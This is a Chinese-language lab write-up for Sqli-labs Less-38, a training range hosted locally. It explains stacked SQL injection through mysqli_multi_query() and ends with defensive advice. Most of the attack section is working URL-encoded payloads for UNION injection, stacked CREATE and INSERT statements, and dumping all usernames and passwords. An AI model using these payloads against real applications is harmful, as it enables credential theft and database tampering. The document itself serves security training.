# 题目：Sqli-labs Less-38

## 题目描述
页面提示 `Please input the ID as parameter with numeric value`，回显 `Your Username is : ...` / `Your Password is : ...`。标题是 `Less-38 **stacked Query**`。
本关引入 `mysqli_multi_query()`，该函数支持**一次执行多条SQL语句**，考察堆叠注入；同时也是单引号闭合的字符型注入，也可以使用普通联合查询。

## 核心原理与前置分析
后台关键PHP源码：
```php
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
if (mysqli_multi_query($con1, $sql))
{
    if ($result = mysqli_store_result($con1)) { ... 打印第一行 ... }
    if (mysqli_more_results($con1)) { ... }
}
```

* **两个核心关键点**
1. **`mysqli_multi_query()`支持多语句执行**：payload 中单引号闭合原有 SQL 后使用分号`;`，分号后面可以拼接第二条 SQL 语句一起执行；普通`mysqli_query()`不支持分号堆叠多条语句。
2. **仅渲染第一条 SQL 的结果集**：程序通过`mysqli_store_result()`只获取第一条 SELECT 的返回数据。堆叠在分号后的第二条`select`语句**可以执行，但是页面不会回显任何结果**。

* **两种利用方式**
- **UNION 联合查询**：把查询数据合并进第一条 SELECT，页面正常回显数据，和前面关卡用法一致；
- **堆叠注入 stacked query**：通过`;`执行`create`、`insert`、`update`等写操作，页面无回显，需要到数据库内验证执行效果。

## 解题思路
1. 使用 union 联合查询确认单引号注入点，判断列数与回显位置；
2. 构造带分号 payload 验证堆叠多语句是否可以执行；
3. 堆叠执行建表、插入数据等写操作，在数据库中观察执行结果；
4. 堆叠配合建表导出数据：将 users 的数据插入自建临时表，再使用 union 查询临时表读出数据；
5. 备选方案：直接使用普通 UNION 联合查询完成脱库，不需要堆叠。

## 解题步骤
### 1. 确认注入点与列数
```
GET /sqli-labs/Less-38/?id=-1%27%20union%20select%201,2,3--%20- HTTP/1.1
Host: 127.0.0.1
```

回显
```
Your Username is : 2
Your Password is : 3
```
单引号闭合成功，一共**3 列**，第 2、3 列为可回显位置。

### 2. 确认堆叠语句能够执行
```
GET /sqli-labs/Less-38/?id=1%27;%20select%201--%20- HTTP/1.1
Host: 127.0.0.1
```
页面正常返回 Dumb 数据，没有 SQL 报错，代表分号后面的 SQL 语句被`mysqli_multi_query`接收执行，堆叠注入生效。

### 3. 堆叠写操作测试（页面无回显，需要登录 MySQL 数据库查看）
创建临时表 zz_t38
```
GET /sqli-labs/Less-38/?id=1%27;%20create%20table%20zz_t38(a%20int)--%20- HTTP/1.1
Host: 127.0.0.1
```

数据库执行查看表：
```
SHOW TABLES;
```
security 库中出现`zz_t38`代表建表成功。

向临时表插入数据：
```
GET /sqli-labs/Less-38/?id=1%27;%20insert%20into%20zz_t38%20values(123)--%20- HTTP/1.1
Host: 127.0.0.1
```

数据库查询验证：
```
SELECT * FROM zz_t38;
```

查询得到数据`123`，说明 insert 语句执行成功。
> 注意：create、insert 这类写操作页面不会输出任何结果，只能去数据库内部确认是否生效。

### 4. 堆叠注入实现脱库（堆叠建表导出数据，再 union 读取）
1. 创建存储数据的临时表 dump38
```
GET /sqli-labs/Less-38/?id=1%27;%20create%20table%20dump38(username%20varchar(100),password%20varchar(100))--%20- HTTP/1.1
Host: 127.0.0.1
```

2. 将 users 表账号密码全部插入临时表
```
GET /sqli-labs/Less-38/?id=1%27;%20insert%20into%20dump38%20select%20username,password%20from%20users--%20- HTTP/1.1
Host: 127.0.0.1
```

3. 使用 union 查询读取临时表中的账号密码
```
GET /sqli-labs/Less-38/?id=-1%27%20union%20select%201,group_concat(username,0x3a,password),3%20from%20dump38--%20- HTTP/1.1
Host: 127.0.0.1
```
页面回显所有用户名密码。

## 踩坑记录
1. **不要误以为堆叠的 select 语句会页面回显**。程序只处理第一条 SQL 结果集；分号后的 SQL 虽然执行成功，但不会输出到页面，需要去数据库中确认效果。
2. 堆叠注入依赖`mysqli_multi_query()`函数；普通`mysqli_query`、旧版`mysql_query`不支持分号执行多条 SQL，无法堆叠。
3. 使用`or`做逻辑判断需要注意 MySQL 真值，`1 or 1=0`依旧返回数据，条件判断优先使用`and 1=1 / and 1=2`对比。
4. 注释`-- -`中间空格不可省略，URL 编码使用`--%20-`或者`%23`。
5. 练习堆叠写操作尽量使用自定义临时表，测试完成执行`drop table`清理；不要直接修改靶场原始 users 表，避免破坏靶场环境。

## 知识点总结
1. **堆叠注入**：利用分号`;`分割多条 SQL 语句，依赖多语句执行函数`mysqli_multi_query()`。
2. 结果集限制：PHP 只获取第一条 SQL 返回数据，堆叠后面的 select 语句执行但是页面无输出；想要页面回显优先使用 UNION 联合查询。
3. 堆叠注入的危害远大于普通 union 查询：除查询外，可以执行`create / insert / update / delete`写操作，权限足够还可以文件读写。
4. 简单判断是否支持堆叠：传入`1'; select 1 -- -`，观察页面是否正常不报错。

**防御**: 使用预编译 + 参数绑定；优先使用单语句`mysqli_query`，关闭多语句执行功能；数据库账号遵循最小权限原则，限制 CREATE、FILE 等高风险权限。
